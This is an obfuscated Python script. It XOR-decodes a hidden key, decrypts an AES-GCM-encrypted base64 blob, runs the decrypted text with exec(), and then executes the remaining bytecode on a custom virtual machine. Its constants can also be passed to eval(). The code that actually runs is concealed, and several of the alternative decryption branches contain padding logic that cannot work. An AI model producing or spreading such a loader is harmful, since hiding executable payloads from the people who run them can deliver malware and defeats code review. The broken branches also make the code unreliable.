#!/usr/bin/env python3
def _kiwvsth(_sq):
    return _sq % 9524 + 1

import hashlib as _gnesn, hmac as _hs, base64 as _xyl, sys as _tj, zlib as _viivr
_sq = 611401
_gdnf = """7+TN0DF9RQBCTUjlJhcisOXpggwaWhA14z46JfRcsSInzkpsq7mDT7CplBLzybAP1vYHjFePkRo/tD4HGD0B9Hm4Z3HSWLLKxWVKsJsLRz6uD/GlxLx2nmhnq/PB1wtQV5HdvvxJJ30g7v6MBKyAQgmpxcJPqwGDWvHrt6iFje2zPqeVr8f+oft8IGfsqiS5meH96LXTgjtTbuXCsXsYPqdwI9gxkKXQ2ksq1y+ggpjIRGkn5dVB9pN9aCjHGp5X0Ga+4hLtSwGEq3oEdRYdofHRtiSYpCe4Du/HBclDaKN/gv9vIhQSggoKhQ8HWttZKw=="""
_ya = 3
_zguw = _kiwvsth(_sq)

def _vm_run(_code, _consts, _names, _globals, _locals):
    _r = [None] * 64
    _ip = 0
    _n = len(_code)
    _b = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
    while _ip < _n:
        _op = _code[_ip]
        _rd = _code[_ip + 1]
        _rs1 = _code[_ip + 2]
        _rs2 = _code[_ip + 3]
        _imm = _code[_ip + 4] | (_code[_ip + 5] << 8) | (_code[_ip + 6] << 16) | (_code[_ip + 7] << 24)
        if _op == 0:
            pass
        elif _op == 1:
            _r[_rd] = _consts[_imm]
        elif _op == 2:
            _nm = _names[_imm]
            _r[_rd] = _globals.get(_nm) if _nm in _globals else _b.get(_nm, _nm)
        elif _op == 3:
            _globals[_names[_imm]] = _r[_rd]
        elif _op == 4:
            _r[_rd] = _locals.get(_names[_imm], None)
        elif _op == 5:
            _locals[_names[_imm]] = _r[_rd]
        elif _op == 6:
            _r[_rd] = _r[_rs1]
        elif _op == 60:
            _r[_rd] = getattr(_r[_rs1], _names[_imm])
        elif _op == 61:
            _r[_rd] = __import__(_names[_imm])
        elif _op == 10:
            _r[_rd] = _r[_rs1] + _r[_rs2]
        elif _op == 11:
            _r[_rd] = _r[_rs1] - _r[_rs2]
        elif _op == 12:
            _r[_rd] = _r[_rs1] * _r[_rs2]
        elif _op == 13:
            _r[_rd] = _r[_rs1] / _r[_rs2]
        elif _op == 14:
            _r[_rd] = _r[_rs1] ** _r[_rs2]
        elif _op == 15:
            _r[_rd] = -_r[_rs1]
        elif _op == 20:
            _r[_rd] = _r[_rs1] == _r[_rs2]
        elif _op == 21:
            _r[_rd] = _r[_rs1] != _r[_rs2]
        elif _op == 22:
            _r[_rd] = _r[_rs1] < _r[_rs2]
        elif _op == 23:
            _r[_rd] = _r[_rs1] <= _r[_rs2]
        elif _op == 24:
            _r[_rd] = _r[_rs1] > _r[_rs2]
        elif _op == 25:
            _r[_rd] = _r[_rs1] >= _r[_rs2]
        elif _op == 30:
            _ip = _imm * 8
            continue
        elif _op == 31:
            if _r[_rd]:
                _ip = _imm * 8
            else:
                _ip += 8
            continue
        elif _op == 32:
            if not _r[_rd]:
                _ip = _imm * 8
            else:
                _ip += 8
            continue
        elif _op == 33:
            _r[_rd] = _r[_rs1][_r[_rs2]]
        elif _op == 50:
            _r[_rs1][_r[_rs2]] = _r[_rd]
        elif _op == 40:
            _fn = _r[_rs1]
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_imm & 0xFFFF))
            import sys as _s
            _s.stderr.write(f"[vm] CALL rd={_rd} rs1={_rs1} argc={_imm} fn_type={type(_fn).__name__} fn={_fn!r} args={_args!r}\n")
            _r[_rd] = _fn(*_args)
        elif _op == 41:
            _r[_rd] = _names[_rd](*_r[_rs1:_rs1 + (_imm & 0xFFFF)])
        elif _op == 42:
            return _r[_rd]
        elif _op == 43:
            _r[_rd] = tuple(_r[_rs1:_rs1 + _rs2])
        elif _op == 44:
            _r[_rd] = list(_r[_rs1:_rs1 + _rs2])
        elif _op == 62:
            _r[_rd] = str(_r[_rs1])
        elif _op == 63:
            _r[_rd] = ''.join(str(_r[_rs1 + _i]) for _i in range(_rs2))
        elif _op == 70:
            _r[_rd] = iter(_r[_rs1])
        elif _op == 71:
            try:
                _r[_rd] = next(_r[_rs1])
            except StopIteration:
                _ip = _imm * 8
                continue
        elif _op == 72:
            _r[_rd].extend(_r[_rs1])
        elif _op == 75:
            _r[_rd].append(_r[_rs1])
        elif _op == 52:
            _v = _r[_rs1]
            if _imm == 0:
                if not (_v + 1 == _v): pass
            elif _imm == 1:
                if not (_v != _v): pass
            else:
                if not (_v - 1 == _v): pass
        elif _op == 53:
            _v = _r[_rs1]
            if _imm == 0:
                if _v * 0 != 0: pass
            elif _imm == 1:
                if _v != _v: pass
            else:
                if _v + 1 == _v: pass
        _ip += 8

def _vm_deserialize(_data):
    _pos = 0
    _hl = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
    _hot = _data[_pos:_pos+_hl].decode('utf-8'); _pos += _hl
    _cc = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
    _consts = []
    for _ in range(_cc):
        _t = _data[_pos]; _pos += 1
        _sl = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
        _s = _data[_pos:_pos+_sl]; _pos += _sl
        if _t == 0: _v = None
        elif _t == 1: _v = _s == b'1'
        elif _t == 2: _v = int(_s)
        elif _t == 3: _v = float(_s)
        elif _t == 4: _v = _s.decode('utf-8')
        elif _t == 6: _v = eval(_s)
        elif _t == 7: _v = _s
        elif _t == 8: _v = eval(_s)
        else: _v = _s
        _consts.append(_v)
    _nc = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
    _names = []
    for _ in range(_nc):
        _nl = int.from_bytes(_data[_pos:_pos+2], 'little'); _pos += 2
        _names.append(_data[_pos:_pos+_nl].decode('utf-8')); _pos += _nl
    _ic = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
    _code = _data[_pos:_pos+_ic*8]
    return _hot, _code, _consts, _names

def _ppu():
    _rhiwbxq = bytes.fromhex("2c1d161f1b00422b0a090e1a031b42240a1642195e415f")
    _rhiwbxq = bytes(_ ^ 111 for _ in _rhiwbxq).decode()
    _pb = _xyl.b64decode(_gdnf)
    if _ya == 8:
        _lbpij = ('0','1','2','3','4','5','6','7','8','9',
                'A','B','C','D','E','F','G','H','I','J','K','L','M',
                'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                'a','b','c','d','e','f','g','h','i','j','k','l','m',
                'n','o','p','q','r','s','t','u','v','w','x','y','z',
                '!','#','$','%','&','(',')','*','+','-',';','<','=',
                '>','?','@','^','_','`','{','|','}','~')
        _xqm = {c:i for i,c in enumerate(_lbpij)}
        def _wndr(_hdhs):
            _frycqp = bytearray(); _nbvy = 0
            while _nbvy < len(_hdhs):
                _yqxid = 0; _ys = 0
                while _nbvy < len(_hdhs) and _ys < 5:
                    _yqxid = _yqxid * 85 + _xqm[chr(_hdhs[_nbvy])]; _nbvy += 1; _ys += 1
                _xf = _ys - 1
                if _xf > 0: _frycqp.extend(_yqxid.to_bytes(4, 'big')[4-_xf:])
            return bytes(_frycqp)
        _wn = _wndr(_pb)
    elif _ya == 7:
        _wn = _xyl.b32decode(_pb)
    elif _ya == 2:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _tw, algorithms as _avw, modes as _oxkd
        except ImportError:
            _tj.stderr.write("error: cryptography not installed\n"); _tj.exit(1)
        _ahgi = _pb[:16]; _vhsqz = _pb[-32:]; _dcukfj = _pb[16:-32]
        _axc = _gnesn.pbkdf2_hmac('sha256', _rhiwbxq.encode(), _ahgi, 100000, dklen=80)
        _nkp = _axc[:32]; _te = _axc[32:48]; _pph = _axc[48:80]
        _xqtas = _hs.new(_pph, _dcukfj, _gnesn.sha256).digest()
        if not _hs.compare_digest(_vhsqz, _xqtas):
            _tj.stderr.write("error: integrity check failed\n"); _tj.exit(1)
        _mzwew = _tw(_avw.AES(_nkp), _oxkd.CTR(_te))
        _wn = _mzwew.decryptor().update(_dcukfj)
    elif _ya == 5:
        _ahgi = _pb[:16]; _vhsqz = _pb[-32:]; _dcukfj = _pb[16:-32]
        _axc = _gnesn.pbkdf2_hmac('sha256', _rhiwbxq.encode(), _ahgi, 100000, dklen=64)
        _nkp = _axc[:32]; _pph = _axc[32:64]
        _xqtas = _hs.new(_pph, _dcukfj, _gnesn.sha256).digest()
        if not _hs.compare_digest(_vhsqz, _xqtas):
            _tj.stderr.write("error: integrity check failed\n"); _tj.exit(1)
        _wn = bytes(_dcukfj[i] ^ _nkp[i % 32] for i in range(len(_dcukfj)))
    elif _ya == 1:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _tw, algorithms as _avw, modes as _oxkd
        except ImportError:
            _tj.stderr.write("error: cryptography not installed\n"); _tj.exit(1)
        _ahgi = _pb[:16]; _vhsqz = _pb[-32:]; _dcukfj = _pb[16:-32]
        _axc = _gnesn.pbkdf2_hmac('sha256', _rhiwbxq.encode(), _ahgi, 100000, dklen=80)
        _nkp = _axc[:32]; _te = _axc[32:48]; _pph = _axc[48:80]
        _xqtas = _hs.new(_pph, _dcukfj, _gnesn.sha256).digest()
        if not _hs.compare_digest(_vhsqz, _xqtas):
            _tj.stderr.write("error: integrity check failed\n"); _tj.exit(1)
        _mzwew = _tw(_avw.AES(_nkp), _oxkd.CBC(_te))
        _wn = _mzwew.decryptor().update(_dcukfj) + _mzwew.finalize()
        _wn = _wn[-1]
        if _wn < 1 or _wn > 16 or not all(_ == _wn for _ in _wn[-_wn:]):
            _tj.stderr.write("error: decryption failed\n"); _tj.exit(1)
        _wn = _wn[:-_wn]
    elif _ya == 9:
        def _ogttpn(_ufo):
            if _ufo[:2] == b'<~': _ufo = _ufo[2:]
            if _ufo[-2:] == b'~>': _ufo = _ufo[:-2]
            _vf = bytearray(); _kilk = 0
            while _kilk < len(_ufo):
                if _ufo[_kilk] == 122:
                    _vf.extend(b'\x00\x00\x00\x00'); _kilk += 1; continue
                _jcsrgos = 0; _xp = 0
                while _kilk < len(_ufo) and _xp < 5:
                    _jcsrgos = _jcsrgos * 85 + (_ufo[_kilk] - 33); _kilk += 1; _xp += 1
                _jfnez = _xp - 1
                if _jfnez > 0: _vf.extend(_jcsrgos.to_bytes(4, 'big')[4-_jfnez:])
            return bytes(_vf)
        _wn = _ogttpn(_pb)
    elif _ya == 0:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _tw, algorithms as _avw, modes as _oxkd
        except ImportError:
            _tj.stderr.write("error: cryptography not installed\n"); _tj.exit(1)
        _ahgi = _pb[:16]; _vhsqz = _pb[-32:]; _dcukfj = _pb[16:-32]
        _axc = _gnesn.pbkdf2_hmac('sha256', _rhiwbxq.encode(), _ahgi, 100000, dklen=64)
        _nkp = _axc[:32]; _pph = _axc[32:64]
        _xqtas = _hs.new(_pph, _dcukfj, _gnesn.sha256).digest()
        if not _hs.compare_digest(_vhsqz, _xqtas):
            _tj.stderr.write("error: integrity check failed\n"); _tj.exit(1)
        _mzwew = _tw(_avw.AES(_nkp), _oxkd.ECB())
        _wn = _mzwew.decryptor().update(_dcukfj) + _mzwew.finalize()
        _wn = _wn[-1]
        if _wn < 1 or _wn > 16 or not all(_ == _wn for _ in _wn[-_wn:]):
            _tj.stderr.write("error: decryption failed\n"); _tj.exit(1)
        _wn = _wn[:-_wn]
    elif _ya == 10:
        _wn = bytes.fromhex(_pb.decode('ascii'))
    elif _ya == 6:
        _wn = _xyl.b64decode(_pb)
    elif _ya == 4:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _tw, algorithms as _avw, modes as _oxkd
        except ImportError:
            _tj.stderr.write("error: cryptography not installed\n"); _tj.exit(1)
        _ahgi = _pb[:16]; _vhsqz = _pb[-32:]; _dcukfj = _pb[16:-32]
        _axc = _gnesn.pbkdf2_hmac('sha256', _rhiwbxq.encode(), _ahgi, 100000, dklen=80)
        _nkp = _axc[:32]; _te = _axc[32:48]; _pph = _axc[48:80]
        _xqtas = _hs.new(_pph, _dcukfj, _gnesn.sha256).digest()
        if not _hs.compare_digest(_vhsqz, _xqtas):
            _tj.stderr.write("error: integrity check failed\n"); _tj.exit(1)
        _mzwew = _tw(_avw.ChaCha20(_nkp, _te), mode=None)
        _wn = _mzwew.decryptor().update(_dcukfj)
    elif _ya == 3:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _lg
        except ImportError:
            _tj.stderr.write("error: cryptography not installed\n"); _tj.exit(1)
        _ahgi = _pb[:16]; _vhsqz = _pb[-32:]; _wn = _pb[16:-32]
        _dcukfj = _wn[:-16]; _xpgbptl = _wn[-16:]
        _axc = _gnesn.pbkdf2_hmac('sha256', _rhiwbxq.encode(), _ahgi, 100000, dklen=76)
        _nkp = _axc[:32]; _te = _axc[32:44]; _pph = _axc[44:76]
        _xqtas = _hs.new(_pph, _wn, _gnesn.sha256).digest()
        if not _hs.compare_digest(_vhsqz, _xqtas):
            _tj.stderr.write("error: integrity check failed\n"); _tj.exit(1)
        _wn = _lg(_nkp).decrypt(_te, _dcukfj + _xpgbptl, None)
    else:
        _tj.stderr.write("error: unsupported algorithm\n"); _tj.exit(1)
    _wn, _c, _k, _m = _vm_deserialize(_wn[4:])
    exec(compile(_wn, '<vm>', 'exec'), globals())
    _vm_run(_c, _k, _m, globals(), locals())
if __name__ == '__main__':
    _ppu()
